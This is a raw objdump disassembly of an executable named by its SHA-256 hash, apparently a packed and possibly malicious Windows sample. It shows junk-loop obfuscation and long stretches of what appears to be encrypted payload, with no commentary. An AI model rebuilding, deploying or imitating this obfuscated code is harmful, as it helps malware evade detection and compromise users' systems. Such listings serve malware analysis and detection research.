
dc973e2c680b80da6319446295345371179164723edfb5f003fa0a8269e335e0.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433797,0x1c
  401013:	cmp    DWORD PTR ds:0x433797,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433797,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433797,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433797
  401055:	dec    eax
  401056:	mov    ds:0x433797,eax
  40105b:	mov    eax,ds:0x433797
  401060:	dec    eax
  401061:	mov    ds:0x433797,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43379b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43379f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4337d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4337af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433793
  4010b6:	mov    DWORD PTR ds:0x4337af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43382b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4337af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4337af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4337af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4337af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4337af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4337af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4337af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4337af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433777
  40113c:	mov    eax,ds:0x433833
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43381b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4336ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43371f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43375b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [edx+0x7e11684e],bl
  4011bc:	jle    0x40123c
  4011be:	jle    0x4011ba
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    eax,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR [ebx+0x0],eax
  4011d2:	rdpmc  
  4011d4:	xadd   BYTE PTR [eax],bl
  4011d7:	(bad)  
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0xc13eb73a
  40126d:	test   DWORD PTR [bp+di-0x6c],edx
  401271:	outs   dx,DWORD PTR ds:[esi]
  401272:	stc    
  401273:	fsubr  st,st(0)
  401275:	test   BYTE PTR [ebp+0x4f],dl
  401278:	cmp    al,0xef
  40127a:	mov    cl,0xbb
  40127c:	xchg   esp,eax
  40127d:	add    bh,BYTE PTR [esp+esi*4-0x30bdc78a]
  401284:	lahf   
  401285:	mov    ah,0xb6
  401287:	xchg   ah,dh
  401289:	add    ch,BYTE PTR [edi+0x354c3bfe]
  40128f:	shl    DWORD PTR [eiz*4-0x1905a020],cl
  401296:	sub    BYTE PTR [ecx],bh
  401298:	fisubr DWORD PTR [esi-0xb]
  40129b:	pinsrw mm3,WORD PTR [esi],0xc1
  40129f:	arpl   WORD PTR [edi],di
  4012a1:	mov    esp,0x3f9516ec
  4012a6:	mov    ah,0x94
  4012a8:	aad    0x10
  4012aa:	dec    edx
  4012ab:	push   edi
  4012ac:	add    ch,al
  4012ae:	(bad)  
  4012af:	push   eax
  4012b0:	lahf   
  4012b1:	adc    dl,BYTE PTR ds:0x6bd85a64
  4012b7:	jne    0x401242
  4012b9:	sbb    BYTE PTR [esi-0x602dff28],ah
  4012bf:	dec    ebx
  4012c0:	iret   
  4012c1:	pop    ebx
  4012c2:	sbb    bh,BYTE PTR [eax-0x7a]
  4012c5:	add    dh,BYTE PTR [edi+0x77]
  4012c8:	out    dx,al
  4012c9:	ret    0x3c12
  4012cc:	dec    edx
  4012cd:	mov    cl,0xe9
  4012cf:	mov    ds:0xb022c343,al
  4012d4:	jno    0x4012bb
  4012d6:	fld    DWORD PTR [eax+0x2ff17c4]
  4012dc:	xor    BYTE PTR [esi-0x32],al
  4012df:	adc    DWORD PTR [eax+ebx*2],ebp
  4012e2:	and    esp,0xfffffff5
  4012e5:	aad    0x2b
  4012e7:	xor    al,0x1b
  4012e9:	pushf  
  4012ea:	push   0x7889a870
  4012ef:	adc    eax,0xb4a148f6
  4012f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4012f5:	loop   0x4012b7
  4012f7:	imul   esp,DWORD PTR [ebx+0x2f7930a6],0x536bfa72
  401301:	fdivp  st(0),st
  401303:	dec    eax
  401304:	clc    
  401305:	cmp    al,0xf5
  401307:	push   esp
  401308:	fs push edi
  40130a:	stos   DWORD PTR es:[edi],eax
  40130b:	out    dx,eax
  40130c:	(bad)  
  40130d:	fdivp  st(6),st
  40130f:	xchg   esi,eax
  401310:	stos   DWORD PTR es:[edi],eax
  401311:	jge    0x401360
  401313:	cmp    cl,BYTE PTR [esi+eiz*4-0x1f]
  401317:	mov    esp,0x86ec3fc0
  40131c:	add    BYTE PTR [ecx-0x54],0xb7
  401320:	(bad)  
  401321:	imul   ax,WORD PTR [edx-0x3e],0x35d0
  401327:	pop    esp
  401328:	imul   edi,DWORD PTR [ebp*1+0x209445fb],0x91f4e19a
  401333:	jp     0x401313
  401335:	jmp    0xe60f:0xf088c862
  40133c:	push   eax
  40133d:	adc    ch,BYTE PTR [ecx-0x703f5a35]
  401343:	jecxz  0x401349
  401345:	cmp    edx,DWORD PTR [edx-0x77]
  401348:	inc    ebp
  401349:	hlt    
  40134a:	and    DWORD PTR ds:0x433753,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433753
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433753,ebx
  401366:	cmp    DWORD PTR ds:0x433753,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433753,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43370b,0x4336ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	repnz sub ch,bh
  4013b6:	icebp  
  4013b7:	cli    
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x40143d
  4013c0:	pop    ebx
  4013c1:	dec    esi
  4013c2:	xchg   dh,ch
  4013c4:	and    ecx,DWORD PTR [ebx+0x1607cd65]
  4013ca:	add    ah,BYTE PTR [edx+eiz*4-0x2aed052]
  4013d1:	or     DWORD PTR [edx+0x7a],ebx
  4013d4:	xor    ebp,edi
  4013d6:	fs adc al,0x20
  4013d9:	lock dec esi
  4013db:	ret    
  4013dc:	xor    edi,DWORD PTR [esi]
  4013de:	sub    eax,0x84e0aefb
  4013e3:	(bad)  
  4013e4:	xlat   BYTE PTR ds:[ebx]
  4013e5:	xchg   bh,ah
  4013e7:	je     0x40143f
  4013e9:	cmp    esi,DWORD PTR [ebp+0x53ca3e7e]
  4013ef:	dec    esp
  4013f0:	xchg   edx,eax
  4013f1:	mov    ch,0x6
  4013f3:	sti    
  4013f4:	inc    edi
  4013f5:	mov    ds:0x104dd4cb,eax
  4013fa:	imul   ecx,DWORD PTR [eax+0x75fb858b],0x75
  401401:	lea    esi,[esi+0x5d]
  401404:	cld    
  401405:	and    BYTE PTR [edi+0x66],bl
  401408:	and    BYTE PTR [ebx+0x3eb833c9],bh
  40140e:	push   esi
  40140f:	repnz sbb BYTE PTR [ebp+0x6],dl
  401413:	pop    esi
  401414:	xchg   esi,eax
  401415:	sbb    DWORD PTR ds:0xbd0b237e,esp
  40141b:	in     al,dx
  40141c:	xchg   edx,eax
  40141d:	pop    es
  40141e:	cmp    DWORD PTR [edx+0x6c6a7479],0x74
  401425:	test   esi,ebx
  401427:	lea    edx,[eax+0x38]
  40142a:	dec    ecx
  40142b:	mov    bh,0x30
  40142d:	clc    
  40142e:	or     ebx,DWORD PTR [ecx]
  401430:	jg     0x4013f8
  401432:	sub    ch,ch
  401434:	stc    
  401435:	and    eax,0x6cdc47d5
  40143a:	leave  
  40143b:	outs   dx,BYTE PTR ds:[esi]
  40143c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40143d:	jl     0x40142a
  40143f:	sub    edi,ecx
  401441:	push   0x7c862953
  401446:	xchg   edx,eax
  401447:	aaa    
  401448:	mov    edi,0x53bc0fc7
  40144d:	cli    
  40144e:	(bad)  
  40144f:	push   ebx
  401450:	push   eax
  401451:	add    DWORD PTR ds:0xf389618d,esp
  401457:	xor    bl,BYTE PTR [esp+ecx*1-0x284dccce]
  40145e:	data16 mov al,fs:0xe69297b0
  401465:	xchg   DWORD PTR [edx],ebx
  401467:	hlt    
  401468:	out    0x4,eax
  40146a:	stos   BYTE PTR es:[edi],al
  40146b:	es mov eax,0xd7d02ab
  401471:	popf   
  401472:	ret    0x9989
  401475:	mov    esp,edx
  401477:	or     BYTE PTR [esi+0xe],al
  40147a:	jbe    0x401463
  40147c:	add    DWORD PTR [edi-0x1fc6b2de],ebp
  401482:	in     al,dx
  401483:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401484:	in     eax,dx
  401485:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401486:	push   cs
  401487:	mov    DWORD PTR [esi+edx*8],eax
  40148a:	pop    ecx
  40148b:	nop
  40148c:	test   DWORD PTR [edi],0xd8c7dc51
  401492:	stc    
  401493:	aaa    
  401494:	push   esi
  401495:	jo     0x4014bb
  401497:	dec    eax
  401498:	push   0xffffffc6
  40149a:	es mov esi,0xc305a756
  4014a0:	sti    
  4014a1:	inc    edi
  4014a2:	cmc    
  4014a3:	cmp    eax,0x911ce1ae
  4014a8:	mov    esp,0xabecc88f
  4014ad:	inc    esp
  4014ae:	sahf   
  4014af:	mov    ebp,ebp
  4014b1:	inc    eax
  4014b2:	pusha  
  4014b3:	jmp    FWORD PTR [ebp+eiz*2-0x64]
  4014b7:	xchg   ebx,eax
  4014b8:	sub    dl,BYTE PTR [ecx+0x6b]
  4014bb:	or     al,BYTE PTR [ecx-0x6fd46272]
  4014c1:	inc    edx
  4014c2:	dec    edi
  4014c3:	inc    ebp
  4014c4:	inc    eax
  4014c5:	mov    bh,0x53
  4014c7:	push   es
  4014c8:	inc    ebp
  4014c9:	inc    esp
  4014ca:	cmp    eax,0x22540291
  4014cf:	call   0x18463830
  4014d4:	sub    al,0x38
  4014d6:	and    DWORD PTR [ecx+0x7f448008],edx
  4014dc:	add    eax,0xa01d457b
  4014e1:	lahf   
  4014e2:	sti    
  4014e3:	in     al,0x1b
  4014e5:	(bad)  
  4014e6:	xchg   edx,eax
  4014e7:	rcr    DWORD PTR [edx+0x6e],1
  4014ea:	in     al,0xc3
  4014ec:	mov    ebp,0xb894048b
  4014f1:	ds pop ss
  4014f3:	call   0x6110:0x22427289
  4014fa:	(bad)  
  4014fb:	bound  esp,QWORD PTR [edx]
  4014fd:	or     DWORD PTR [esi-0x7c],edi
  401500:	ret    0xb293
  401503:	xchg   edx,eax
  401504:	js     0x4014cd
  401506:	test   eax,0xec663951
  40150b:	repnz push ss
  40150d:	jb     0x4014f6
  40150f:	lods   al,BYTE PTR ds:[esi]
  401510:	jle    0x4014b5
  401512:	loope  0x4014e9
  401514:	aam    0xfb
  401516:	jb     0x4014ff
  401518:	xchg   edx,eax
  401519:	fdivr  DWORD PTR [ebp+0x6a]
  40151c:	xchg   edi,eax
  40151d:	push   cs
  40151e:	gs dec eax
  401520:	pusha  
  401521:	enter  0xe5b4,0x51
  401525:	pop    esp
  401526:	inc    ebp
  401527:	lock test WORD PTR [edi+0x6c],ax
  40152c:	push   edx
  40152d:	fucomi st,st(7)
  40152f:	mov    BYTE PTR [ebx],bh
  401531:	jle    0x4015a7
  401533:	mov    ds:0x820d5a4f,al
  401538:	mov    dh,0x5
  40153a:	inc    ebx
  40153b:	jnp    0x4014f2
  40153d:	push   0x33
  40153f:	add    eax,0x8bd810ba
  401544:	inc    ebp
  401545:	les    esi,FWORD PTR [ecx]
  401547:	sbb    eax,0x43370f
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x67b6b01d]
  401564:	aad    0x6
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x40157d
  40156e:	in     eax,dx
  40156f:	pop    eax
  401570:	shl    dl,1
  401572:	mov    esi,0xf01b2db9
  401577:	pop    edi
  401578:	cmp    DWORD PTR [eax],0xa
  40157b:	and    al,0x9
  40157d:	pop    ds
  40157e:	shr    cl,cl
  401580:	ja     0x40152f
  401582:	xchg   ecx,eax
  401583:	jns    0x4015a5
  401585:	mov    esp,0x6dd1222e
  40158a:	sub    ebx,DWORD PTR [esi+0x7f0697a9]
  401590:	pop    ecx
  401591:	and    eax,0x17979885
  401596:	test   DWORD PTR [eax+0x5f],ecx
  401599:	sbb    ecx,edx
  40159b:	je     0x401585
  40159d:	lea    edi,[edi+ebp*8+0x5f521b9d]
  4015a4:	jnp    0x4015e5
  4015a6:	fcmovnb st,st(2)
  4015a8:	ror    BYTE PTR [edx+0x7],1
  4015ab:	fwait
  4015ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015ad:	lea    edi,[edi+0x0]
  4015b0:	ja     0x4015ca
  4015b2:	mov    esi,ebx
  4015b4:	adc    eax,0xd602e3b
  4015b9:	mov    bl,0x44
  4015bb:	inc    eax
  4015bc:	dec    esi
  4015bd:	inc    BYTE PTR [ebx+0x71]
  4015c0:	pusha  
  4015c1:	add    eax,0x2cc6913
  4015c6:	das    
  4015c7:	ss and esi,edx
  4015ca:	repnz push 0x6ff06f2f
  4015d0:	xchg   DWORD PTR [di+0x3e],ecx
  4015d4:	fcomp  DWORD PTR [eax+0x13]
  4015d7:	jecxz  0x40164b
  4015d9:	cs xor dl,bh
  4015dc:	pop    edx
  4015dd:	pushf  
  4015de:	xchg   edx,eax
  4015df:	xchg   edx,eax
  4015e0:	aas    
  4015e1:	mov    bl,0xd5
  4015e3:	or     eax,0x8d32a2f9
  4015e8:	xor    eax,DWORD PTR [ebx+0x46d487a8]
  4015ee:	repz repnz retf 0xb922
  4015f3:	sub    BYTE PTR [ecx-0x72],al
  4015f6:	shr    BYTE PTR [esi+0x31a0283d],1
  4015fc:	sub    BYTE PTR [esi],al
  4015fe:	pusha  
  4015ff:	mov    ds:0x9ecbfbd8,eax
  401604:	aad    0xb9
  401606:	inc    ebx
  401607:	or     al,0xca
  401609:	push   ecx
  40160a:	ja     0x4015df
  40160c:	jno    0x401677
  40160e:	enter  0xec5a,0xce
  401612:	push   0xffffff95
  401614:	imul   esp,DWORD PTR [esi+esi*4],0x14
  401618:	pushf  
  401619:	(bad)  
  40161a:	cmp    BYTE PTR [eax+0x4e],dh
  40161d:	push   ebp
  40161e:	ror    BYTE PTR [ebx],0x1
  401621:	xor    DWORD PTR [edi+0x1b],esi
  401624:	adc    BYTE PTR [ecx-0x32],al
  401627:	push   edi
  401628:	pop    esp
  401629:	push   esi
  40162a:	jnp    0x401612
  40162c:	inc    ebp
  40162d:	ja     0x401633
  40162f:	add    DWORD PTR ds:[ecx+0x52],esp
  401633:	jne    0xefe32c2e
  401639:	fstp   QWORD PTR [ecx-0xcf7a932]
  40163f:	cmp    al,0x59
  401641:	(bad)  
  401642:	(bad)  [ebx-0x2dfa9294]
  401648:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401649:	pop    ecx
  40164a:	aad    0xff
  40164c:	imul   eax
  40164e:	dec    esi
  40164f:	inc    edi
  401650:	jae    0x4015e9
  401652:	ins    DWORD PTR es:[edi],dx
  401653:	fiadd  WORD PTR [ebp-0x5f]
  401656:	out    0xf0,al
  401658:	loope  0x401601
  40165a:	fsub   st,st(7)
  40165c:	(bad)  
  40165d:	jmp    0x8a0e1135
  401662:	lods   al,BYTE PTR ds:[esi]
  401663:	xor    al,0xbd
  401665:	in     al,dx
  401666:	(bad)  
  401667:	cld    
  401668:	xor    bl,0x7a
  40166b:	jecxz  0x4015f9
  40166d:	rcl    ecx,1
  40166f:	cmp    edi,esi
  401671:	mov    WORD PTR [edx],?
  401673:	retf   0x25d0
  401676:	xchg   esp,eax
  401677:	sar    DWORD PTR [ecx+0x1e],0x88
  40167b:	push   0xffffff85
  40167d:	cmp    ah,BYTE PTR [edi]
  40167f:	outs   dx,DWORD PTR ds:[esi]
  401680:	add    BYTE PTR [ecx-0x70e794ee],0x88
  401687:	outs   dx,DWORD PTR ds:[esi]
  401688:	rcr    ebp,cl
  40168a:	leave  
  40168b:	add    ah,dl
  40168d:	jae    0x4016af
  40168f:	mov    dl,0xeb
  401691:	adc    ebx,esi
  401693:	mov    ebp,0x343e75aa
  401698:	sbb    al,0xb2
  40169a:	fs pop eax
  40169c:	lock ss push ds
  40169f:	int3   
  4016a0:	out    dx,al
  4016a1:	(bad)  
  4016a2:	jecxz  0x4016b6
  4016a4:	or     DWORD PTR [esi],edi
  4016a6:	xchg   ebx,eax
  4016a7:	fist   WORD PTR [esi+0x23]
  4016aa:	inc    eax
  4016ab:	jle    0x40171a
  4016ad:	jmp    0xde0254b7
  4016b2:	out    dx,eax
  4016b3:	pop    edi
  4016b4:	pmaxsw mm6,QWORD PTR [edx+ecx*1+0x358bcde]
  4016bc:	and    edx,edx
  4016be:	and    BYTE PTR [esi],ah
  4016c0:	or     eax,0x97452fb1
  4016c5:	xor    ebx,DWORD PTR [ecx]
  4016c7:	jmp    0x660fd9ef
  4016cc:	push   ss
  4016cd:	lahf   
  4016ce:	add    DWORD PTR [esi-0x10],ebx
  4016d1:	xor    esp,esi
  4016d3:	cmp    al,0xb
  4016d5:	xchg   edx,eax
  4016d6:	std    
  4016d7:	pop    esp
  4016d8:	push   ecx
  4016d9:	cmp    eax,0xf4ee96d2
  4016de:	mov    edi,0x8114c27
  4016e3:	push   ecx
  4016e4:	daa    
  4016e5:	add    BYTE PTR [ecx+0x2cb832be],bl
  4016eb:	test   dl,0xfc
  4016ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016ef:	mov    ds:0x89c70365,al
  4016f4:	inc    ebp
  4016f5:	int3   
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4337df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4337df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4337df,ebx
  401721:	cmp    DWORD PTR ds:0x4337df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4337df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4337df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4337df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4337df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433703,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433717
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43370b
  401793:	and    ecx,DWORD PTR ds:0x43375b
  401799:	mov    DWORD PTR ds:0x43370b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43382f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43382f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43382f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43382f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43382f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43382f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43382f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43382f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4337e3,0x0
  401819:	mov    eax,ds:0x4337e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4337e3,eax
  401824:	cmp    DWORD PTR ds:0x4337e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433723
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4337e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43381f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43382b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43382b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43382b,ecx
  401878:	cmp    DWORD PTR ds:0x43382b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43382b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43382b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43382b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43382b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0xa7c66ade
  4018e9:	adc    al,BYTE PTR [edx+eax*4-0x5818186]
  4018f0:	jg     0x401970
  4018f2:	jle    0x401908
  4018f4:	jnp    0x401950
  4018f6:	xchg   BYTE PTR [ecx+0x8],dh
  4018f9:	iret   
  4018fa:	clc    
  4018fb:	fucomi st,st(7)
  4018fd:	mov    eax,0xedbd8a02
  401902:	sbb    bh,al
  401904:	jne    0x401937
  401906:	pop    esi
  401907:	jne    0x4018c4
  401909:	outs   dx,DWORD PTR ds:[esi]
  40190a:	xlat   BYTE PTR ds:[ebx]
  40190b:	push   ebp
  40190c:	xor    esp,DWORD PTR [edi+0x2f214fd2]
  401912:	jae    0x4018d3
  401914:	call   0xbe4f:0x2076e3ab
  40191b:	push   esp
  40191c:	pop    ecx
  40191d:	enter  0xbab6,0xf3
  401921:	pop    ss
  401922:	xchg   edi,eax
  401923:	xor    BYTE PTR [ecx-0x2b330695],bl
  401929:	cmp    edx,DWORD PTR [ebp+0x62a2ffa7]
  40192f:	add    al,0x84
  401931:	into   
  401932:	dec    ebx
  401933:	and    eax,0x40ed6de5
  401938:	ret    
  401939:	vmulsd xmm6,xmm4,xmm5
  40193d:	xchg   edx,eax
  40193e:	add    DWORD PTR ds:0xf0d5270,esi
  401944:	adc    BYTE PTR [eax],dl
  401946:	fistp  WORD PTR [edx+esi*2+0x70c56cf4]
  40194d:	test   al,0xda
  40194f:	add    al,0x85
  401951:	xchg   edi,eax
  401952:	pop    esp
  401953:	(bad)  
  401955:	push   es
  401956:	xlat   BYTE PTR ds:[ebx]
  401957:	inc    ecx
  401958:	into   
  401959:	adc    al,BYTE PTR [ecx]
  40195b:	cmp    eax,0x584cb222
  401960:	popa   
  401961:	imul   edi,DWORD PTR [ecx],0x23
  401964:	xchg   ebx,eax
  401965:	test   al,0xe2
  401967:	in     al,dx
  401968:	or     eax,0xdce7682c
  40196d:	xchg   edi,eax
  40196e:	(bad)  
  40196f:	std    
  401970:	dec    esp
  401971:	lock adc esp,ecx
  401974:	inc    edi
  401975:	imul   eax
  401977:	sub    eax,0x40333c17
  40197c:	std    
  40197d:	mov    cl,bh
  40197f:	push   cs
  401980:	sbb    ah,al
  401982:	rcl    BYTE PTR [eax+eax*4+0x2fa623a4],cl
  401989:	mov    ah,0x7c
  40198b:	push   esp
  40198c:	inc    ecx
